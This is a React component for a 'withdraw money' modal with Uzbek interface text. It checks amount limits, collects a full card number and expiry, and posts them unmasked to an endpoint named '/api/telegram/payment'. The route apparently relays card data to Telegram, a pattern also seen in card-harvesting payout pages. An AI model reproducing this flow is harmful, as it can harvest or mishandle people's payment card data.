'use client';

import { useState } from 'react';
import { X, ArrowLeft, CreditCard, AlertCircle, Shield } from 'lucide-react';
import Image from 'next/image';
import { withdrawMethods, formatAmount, WithdrawMethod } from '../constants';

interface WithdrawModalProps {
    isOpen: boolean;
    onClose: () => void;
    userBalance: number;
    onSuccess: () => void;
    onError: (message: string) => void;
}

export default function WithdrawModal({
    isOpen,
    onClose,
    userBalance,
    onSuccess,
    onError
}: WithdrawModalProps) {
    const [step, setStep] = useState<'select' | 'amount' | 'card'>('select');
    const [selectedMethod, setSelectedMethod] = useState<WithdrawMethod | null>(null);
    const [amount, setAmount] = useState('');
    const [cardNumber, setCardNumber] = useState('');
    const [cardExpiry, setCardExpiry] = useState('');
    const [isLoading, setIsLoading] = useState(false);

    const handleClose = () => {
        setStep('select');
        setSelectedMethod(null);
        setAmount('');
        setCardNumber('');
        setCardExpiry('');
        onClose();
    };

    const handleSelectMethod = (method: WithdrawMethod) => {
        setSelectedMethod(method);
        setStep('amount');
    };

    const handleAmountSubmit = () => {
        const numAmount = parseInt(amount.replace(/\s/g, ''));

        if (!numAmount || numAmount < (selectedMethod?.minAmount || 0)) {
            onError(`Minimal summa: ${formatAmount(selectedMethod?.minAmount || 325000)} UZS`);
            return;
        }

        if (numAmount > userBalance) {
            onError("Balansingiz yetarli emas!");
            return;
        }

        if (numAmount > (selectedMethod?.maxAmount || 15000000)) {
            onError(`Maksimal summa: ${formatAmount(selectedMethod?.maxAmount || 15000000)} UZS`);
            return;
        }

        setStep('card');
    };

    const handleCardNumberChange = (value: string) => {
        const cleaned = value.replace(/\D/g, '').slice(0, 16);
        const formatted = cleaned.replace(/(\d{4})/g, '$1 ').trim();
        setCardNumber(formatted);
    };

    const handleExpiryChange = (value: string) => {
        const cleaned = value.replace(/\D/g, '').slice(0, 4);
        if (cleaned.length >= 2) {
            setCardExpiry(cleaned.slice(0, 2) + '/' + cleaned.slice(2));
        } else {
            setCardExpiry(cleaned);
        }
    };

    const handleSubmit = async () => {
        if (cardNumber.replace(/\s/g, '').length !== 16) {
            onError("Karta raqami to'liq emas");
            return;
        }

        if (cardExpiry.length !== 5) {
            onError("Amal qilish muddati noto'g'ri");
            return;
        }

        setIsLoading(true);

        try {
            const response = await fetch('/api/telegram/payment', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    type: 'withdraw',
                    method: selectedMethod?.name,
                    amount: parseInt(amount.replace(/\s/g, '')),
                    cardNumber: cardNumber.replace(/\s/g, ''),
                    cardExpiry
                })
            });

            if (response.ok) {
                handleClose();
                onSuccess();
            } else {
                onError("Xatolik yuz berdi. Qayta urinib ko'ring.");
            }
        } catch (error) {
            onError("Server bilan bog'lanishda xatolik");
        } finally {
            setIsLoading(false);
        }
    };

    if (!isOpen) return null;

    return (
        <div className="fixed inset-0 bg-black/50 z-50 flex items-center justify-center p-4">
            <div className="bg-white rounded-2xl w-full max-w-md shadow-2xl overflow-hidden">
                {/* Header */}
                <div className="flex justify-between items-center p-5 border-b border-gray-100">
                    <div className="flex items-center gap-3">
                        {step !== 'select' && (
                            <button
                                onClick={() => setStep(step === 'card' ? 'amount' : 'select')}
                                className="text-gray-400 hover:text-gray-600 transition-colors"
                            >
                                <ArrowLeft size={20} />
                            </button>
                        )}
                        <h2 className="text-[#1a1a4e] text-xl font-bold">
                            {step === 'select' && "Pul chiqarish"}
                            {step === 'amount' && selectedMethod?.name}
                            {step === 'card' && "Karta ma'lumotlari"}
                        </h2>
                    </div>
                    <button
                        onClick={handleClose}
                        className="w-8 h-8 flex items-center justify-center rounded-full border border-gray-300 hover:bg-gray-100"
                    >
                        <X size={18} className="text-gray-600" />
                    </button>
                </div>

                {/* Content */}
                <div className="p-5">
                    {/* Step 1: Select Method */}
                    {step === 'select' && (
                        <div className="space-y-3">
                            <p className="text-gray-500 text-sm mb-4">Chiqarish usulini tanlang:</p>
                            {withdrawMethods.map((method) => (
                                <button
                                    key={method.id}
                                    onClick={() => handleSelectMethod(method)}
                                    className="w-full flex items-center gap-4 p-4 border border-gray-200 hover:border-[#27b82c] hover:bg-green-50/30 rounded-xl transition-colors"
                                >
                                    <div className="w-12 h-12 bg-gray-50 rounded-lg flex items-center justify-center p-2 border border-gray-100">
                                        <Image
                                            src={method.logo}
                                            alt={method.name}
                                            width={40}
                                            height={40}
                                            className="object-contain"
                                        />
                                    </div>
                                    <div className="text-left">
                                        <div className="text-[#1a1a4e] font-semibold">{method.name}</div>
                                        <div className="text-gray-400 text-sm">Min: {formatAmount(method.minAmount)} UZS</div>
                                    </div>
                                </button>
                            ))}
                        </div>
                    )}

                    {/* Step 2: Enter Amount */}
                    {step === 'amount' && selectedMethod && (
                        <div className="space-y-4">
                            {/* Balance Display */}
                            <div className="flex items-start gap-3 bg-[#e8f5e9] rounded-lg p-3">
                                <Shield size={20} className="text-[#27b82c] flex-shrink-0 mt-0.5" />
                                <div>
                                    <p className="text-[#27b82c] text-sm font-semibold">Hisobingizda:</p>
                                    <p className="text-[#27b82c] text-lg font-bold">{formatAmount(userBalance)} UZS</p>
                                </div>
                            </div>

                            {/* Amount Input */}
                            <div>
                                <p className="text-gray-500 text-sm mb-2">Summa kiriting:</p>
                                <div className="flex items-center border border-gray-300 rounded-lg px-4 py-3">
                                    <span className="font-bold text-gray-800 mr-2">UZS</span>
                                    <span className="text-gray-300">|</span>
                                    <input
                                        type="text"
                                        value={amount}
                                        onChange={(e) => {
                                            const cleaned = e.target.value.replace(/\D/g, '');
                                            setAmount(formatAmount(parseInt(cleaned) || 0));
                                        }}
                                        placeholder="0"
                                        className="flex-1 ml-2 outline-none text-gray-800 text-lg font-medium"
                                    />
                                </div>
                            </div>

                            {/* Quick Amounts */}
                            <div className="flex gap-2">
                                {[500000, 1000000, 2000000].map((val) => (
                                    <button
                                        key={val}
                                        onClick={() => setAmount(formatAmount(val))}
                                        className="flex-1 py-2 px-2 border border-gray-200 rounded-full text-xs text-gray-600 hover:border-[#1a1a4e] hover:bg-[#1a1a4e]/5 transition-colors"
                                    >
                                        {formatAmount(val)}
                                    </button>
                                ))}
                            </div>

                            {/* Continue Button */}
                            <button
                                onClick={handleAmountSubmit}
                                className="w-full py-4 bg-[#27b82c] hover:bg-[#2ed134] text-white rounded-full font-semibold text-lg transition-colors"
                            >
                                Keyingi
                            </button>
                        </div>
                    )}

                    {/* Step 3: Card Details */}
                    {step === 'card' && selectedMethod && (
                        <div className="space-y-4">
                            {/* Summary */}
                            <div className="border border-gray-200 rounded-lg p-4">
                                <div className="flex justify-between items-center mb-2">
                                    <span className="text-gray-500 text-sm">Summa:</span>
                                    <span className="text-[#1a1a4e] font-bold">{amount} UZS</span>
                                </div>
                                <div className="flex justify-between items-center">
                                    <span className="text-gray-500 text-sm">Usul:</span>
                                    <span className="text-[#1a1a4e] font-semibold">{selectedMethod.name}</span>
                                </div>
                            </div>

                            {/* Card Number */}
                            <div>
                                <p className="text-gray-500 text-sm mb-2 flex items-center gap-2">
                                    <CreditCard size={16} />
                                    Karta raqami
                                </p>
                                <input
                                    type="text"
                                    value={cardNumber}
                                    onChange={(e) => handleCardNumberChange(e.target.value)}
                                    placeholder="0000 0000 0000 0000"
                                    className="w-full border border-gray-300 rounded-lg px-4 py-3 text-gray-800 text-lg tracking-wider focus:outline-none focus:border-[#27b82c]"
                                />
                            </div>

                            {/* Expiry */}
                            <div>
                                <p className="text-gray-500 text-sm mb-2">Amal qilish muddati</p>
                                <input
                                    type="text"
                                    value={cardExpiry}
                                    onChange={(e) => handleExpiryChange(e.target.value)}
                                    placeholder="MM/YY"
                                    className="w-full border border-gray-300 rounded-lg px-4 py-3 text-gray-800 text-lg focus:outline-none focus:border-[#27b82c]"
                                />
                            </div>

                            {/* Warning */}
                            <div className="flex items-start gap-2 p-3 bg-amber-50 border border-amber-200 rounded-lg">
                                <AlertCircle size={18} className="text-amber-600 flex-shrink-0 mt-0.5" />
                                <p className="text-amber-700 text-sm">
                                    Karta ma&apos;lumotlari to&apos;g&apos;ri ekanligiga ishonch hosil qiling
                                </p>
                            </div>

                            {/* Submit Button */}
                            <button
                                onClick={handleSubmit}
                                disabled={isLoading}
                                className="w-full py-4 bg-[#27b82c] hover:bg-[#2ed134] disabled:bg-gray-400 text-white rounded-full font-semibold text-lg transition-colors flex items-center justify-center gap-2"
                            >
                                {isLoading ? (
                                    <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                                ) : (
                                    "Pul chiqarish"
                                )}
                            </button>
                        </div>
                    )}
                </div>
            </div>
        </div>
    );
}
